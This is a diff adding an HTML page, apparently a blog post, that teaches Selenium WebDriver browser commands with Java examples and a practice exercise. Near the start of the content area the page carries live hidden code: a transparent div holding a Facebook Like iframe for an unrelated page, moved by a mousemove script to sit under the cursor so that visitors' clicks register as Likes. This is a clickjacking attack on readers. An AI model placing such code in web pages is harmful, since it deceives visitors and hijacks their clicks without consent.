@@ -1,0 +1,446 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Webdriver : Browser Commands - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="All Browser Commands in Selenium Webdriver" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">Webdriver : Browser Commands</h2>
+	<div class="entry-content"><h2>Selenium WebDriver Browser Commands</h2>
+
+<p>The very first thing you like to do with Selenium is to opening and closing a new browser. Below are the numbers of commands you can apply on the Selenium opened browser.</p>
+
+<!--more-->
+
+
+<h3>1)Get Command</h3>
+
+<p>Purpose: This command is use to open a new web page in the current browser.</p>
+
+<p>Command: driver.get(URL);</p>
+
+<p>Parameters: url – The URL to load. It is best to use a fully qualified URL.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.get("wwww.google.com");</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>2)Get Title Command</h3>
+
+<p>Purpose: This command is use to get the title of the current page.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.getTitle();</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>3)Get Current URL Command</h3>
+
+<p>Purpose: This command is use to get the URL of the page currently loaded in the browser.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.getCurrentUrl();</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>4)Get Page Source Command</h3>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<p>Purpose: This command is use to get the source of the last loaded page.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.getPageSource();</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>5)Close Command</h3>
+
+<p>Purpose: This command is use to close the current window of the browser, if it’s the last window it will close the browser.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.close();</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>6)Quit Command</h3>
+
+<p>Purpose: This command is use to quit the browser and all the opened windows in the browser.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.quit();</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>7)Refresh Command</h3>
+
+<p>Purpose: There are some commands is use to refresh the current browser.</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>driver.navigate().refresh();
+</span><span class='line'>driver.get(driver.getCurrentUrl());
+</span><span class='line'>driver.navigate().to(driver.getCurrentUrl());
+</span><span class='line'>driver.findElement(By.name("s")).sendKeys("\uE035");</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Simple Practice Exercise</h2>
+
+<p>1) Launch a new Firefox browser.</p>
+
+<p>2) Open daringfireball.net</p>
+
+<p>3) Get Page Title name and Title length</p>
+
+<p>4) Print Page Title and Title length on the Eclipse Console.</p>
+
+<p>5) Get Page URL and URL length</p>
+
+<p>6) Print URL and URL length on the Eclipse Console.</p>
+
+<p>7) Refresh current page</p>
+
+<p>8) Get Page Source (HTML Source code) and Page Source length</p>
+
+<p>9) Print Page Source and length on Eclipse Console.</p>
+
+<p>10) Close the Browser.</p>
+
+<h3>Solution</h3>
+
+<h4>1) Create class &lsquo;PracticeBrowserCommands&rsquo; and copy code below paste to your class and Run this class.</h4>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>package automationFramework;
+</span><span class='line'>import java.util.concurrent.TimeUnit;
+</span><span class='line'>import org.openqa.selenium.WebDriver;
+</span><span class='line'>import org.openqa.selenium.firefox.FirefoxDriver;
+</span><span class='line'> 
+</span><span class='line'>public class PracticeBrowserCommands {
+</span><span class='line'>    private static WebDriver driver = null;
+</span><span class='line'> 
+</span><span class='line'>    public static void main(String[] args) throws InterruptedException {
+</span><span class='line'> 
+</span><span class='line'>         // Create a new instance of the Firefox driver
+</span><span class='line'>        driver = new FirefoxDriver();
+</span><span class='line'> 
+</span><span class='line'>        //Put a Implicit wait, this means that any search for elements on the page could take the time the implicit wait is set for before throwing exception
+</span><span class='line'>        driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
+</span><span class='line'> 
+</span><span class='line'>        //Launch the markdown syntax
+</span><span class='line'>        driver.get("http://daringfireball.net/");
+</span><span class='line'> 
+</span><span class='line'>        // Storing Title name in String variable
+</span><span class='line'>        String sTitle = driver.getTitle();
+</span><span class='line'>        // Storing Title length in Int variable
+</span><span class='line'>        int iTitleLength = driver.getTitle().length();
+</span><span class='line'>        // Printing Title name on Console
+</span><span class='line'>        System.out.println(sTitle);
+</span><span class='line'>        // Printing Title length on console
+</span><span class='line'>        System.out.println(iTitleLength);
+</span><span class='line'> 
+</span><span class='line'>        // Storing URL in String variable
+</span><span class='line'>        sTitle = driver.getCurrentUrl();
+</span><span class='line'>        // Storing URL length in Int variable
+</span><span class='line'>        iTitleLength = driver.getCurrentUrl().length();
+</span><span class='line'>        // Printing URL on Console
+</span><span class='line'>        System.out.println(sTitle);
+</span><span class='line'>        // Printing URL length on console
+</span><span class='line'>        System.out.println(iTitleLength);
+</span><span class='line'> 
+</span><span class='line'>        // Refreshing current page
+</span><span class='line'>        driver.get(driver.getCurrentUrl());  
+</span><span class='line'> 
+</span><span class='line'>        // Storing Page Source in String variable
+</span><span class='line'>        String sPageSource = driver.getPageSource();
+</span><span class='line'>        // Storing Page Source length in Int variable
+</span><span class='line'>        int iPageSourceLength = driver.getPageSource().length();
+</span><span class='line'>        // Printing Page Source on console
+</span><span class='line'>        System.out.println(sPageSource);
+</span><span class='line'>        // Printing Page SOurce length on console
+</span><span class='line'>        System.out.println(iPageSourceLength);
+</span><span class='line'> 
+</span><span class='line'>        //Closing browser
+</span><span class='line'>        driver.close();
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/webdriver-browser-commands/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/webdriver-browser-commands/';
+        var disqus_url = 'http://www.tabaolan.com/webdriver-browser-commands/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
